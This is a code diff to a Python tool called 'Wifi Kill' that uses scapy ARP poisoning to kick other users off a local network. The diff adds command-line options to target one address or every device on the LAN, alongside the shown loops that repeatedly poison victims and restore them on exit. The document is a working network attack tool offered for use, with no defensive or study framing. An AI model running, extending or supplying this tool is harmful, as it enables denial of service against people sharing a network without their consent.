@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 ###############################################################################
 #         Wifi Kill                                                           #
@@ -11,6 +11,8 @@
 
 import time
 import os
+import getopt
+import sys
 from builtins import input
 from scapy.all import *
 
@@ -50,7 +52,7 @@ def get_lan_ip():
     # A hacky method to get the current lan ip address. It requires internet
     # access, but it works
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("google.com", 80))
+    s.connect(("8.8.8.8", 80))
     ip = s.getsockname()
     s.close()
     return ip[0]
@@ -59,6 +61,21 @@ def get_lan_ip():
 def printdiv():
     print('--------------------')
 
+
+import argparse
+parser = argparse.ArgumentParser(
+    description='A python program that uses scapy to kick people off of wifi')
+parser.add_argument('-k', help="kill the address",
+                    action='append', metavar='ip|mac')
+parser.add_argument(
+    '-a', help='kill all addresses in the LAN', action='store_true')
+parser.add_argument('-i', help='ignore the address',
+                    action='append', metavar='ip|mac')
+parser.add_argument('-r', help='restore the address',
+                    action='append', metavar='ip|mac')
+parser.add_argument('--lan', help='manually specify the lan ip',
+                    action='append', metavar='ip')
+args = parser.parse_args()
 
 # Check for root
 if os.geteuid() != 0:
@@ -144,6 +161,7 @@ if choice.isdigit():
         while True:
             poison(victim[0], victim[1], gateway_ip)
     except KeyboardInterrupt:
+        print('Restoring')
         restore(victim[0], victim[1], gateway_ip, gateway_mac)
         print('\nYou\'re welcome!')
 elif killall:
@@ -155,6 +173,7 @@ elif killall:
             for victim in devices:
                 poison(victim[0], victim[1], gateway_ip)
     except KeyboardInterrupt:
+        print('Restoring')
         for victim in devices:
             restore(victim[0], victim[1], gateway_ip, gateway_mac)
         print('\nYou\'re welcome!')
